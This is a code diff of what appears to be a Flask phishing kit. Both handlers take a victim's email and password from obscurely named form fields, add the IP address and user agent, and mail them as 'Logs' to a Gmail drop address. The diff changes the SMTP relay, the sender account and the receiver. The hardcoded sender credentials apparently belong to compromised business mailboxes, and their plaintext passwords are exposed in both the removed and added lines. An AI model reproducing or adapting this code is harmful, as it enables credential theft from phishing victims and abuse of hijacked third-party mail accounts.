@@ -145,13 +145,13 @@ def first():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "eissa@waterworldwaterpark.com"
-        sender_emaill = "eissa"
-        receiver_email = "s.toihidi@gmail.com"
-        password = "EISSA47314A"
+        sender_email = "philip.ovbighodua@donmaclimited.com"
+        sender_emaill = "philip.ovbighodua"
+        receiver_email = "giridharavimech@gmail.com"
+        password = "Donmaclimited@1"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
-        message["Subject"] = "WEBMAIL Logs !"
+        message["Subject"] = "Norrm Logs !"
         message["From"] = sender_email
         message["To"] = receiver_email
         text = """\
@@ -164,7 +164,7 @@ def first():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL("mail.waterworldwaterpark.com", 465) as server:
+        with smtplib.SMTP_SSL("mail.donmaclimited.com", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         return redirect(url_for('benza', web=session.get('eman')))
@@ -183,13 +183,13 @@ def second():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "eissa@waterworldwaterpark.com"
-        sender_emaill = "eissa"
-        receiver_email = "s.toihidi@gmail.com"
-        password = "EISSA47314A"
+        sender_email = "philip.ovbighodua@donmaclimited.com"
+        sender_emaill = "philip.ovbighodua"
+        receiver_email = "giridharavimech@gmail.com"
+        password = "Donmaclimited@1"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
-        message["Subject"] = "WEBMAIL logs !! "
+        message["Subject"] = "Norm logs !! "
         message["From"] = sender_email
         message["To"] = receiver_email
         text = """\
@@ -202,7 +202,7 @@ def second():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL("mail.waterworldwaterpark.com", 465) as server:
+        with smtplib.SMTP_SSL("mail.donmaclimited.com", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         return redirect(url_for('lasmo'))
